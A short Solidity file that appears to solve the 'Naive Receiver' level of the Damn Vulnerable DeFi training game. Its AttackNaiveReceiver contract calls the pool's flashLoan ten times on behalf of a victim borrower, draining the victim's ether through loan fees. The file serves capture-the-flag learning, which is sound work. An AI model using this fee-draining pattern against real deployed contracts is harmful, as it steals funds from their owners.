// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface NaiveReceiverLenderPoo {
  function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackNaiveReceiver {

    using Address for address;

    address public borrower;
    address public flashLoanPool;

    constructor(address _borrower, address _flashLoanPool) {
      borrower = _borrower;
      flashLoanPool = _flashLoanPool;
    }

    function Atacar() external {
        uint256 valor = 1 ether;
        for(uint256 i =0; i<10; i++){
          NaiveReceiverLenderPoo(flashLoanPool).flashLoan(borrower,valor);
        }
    }
}
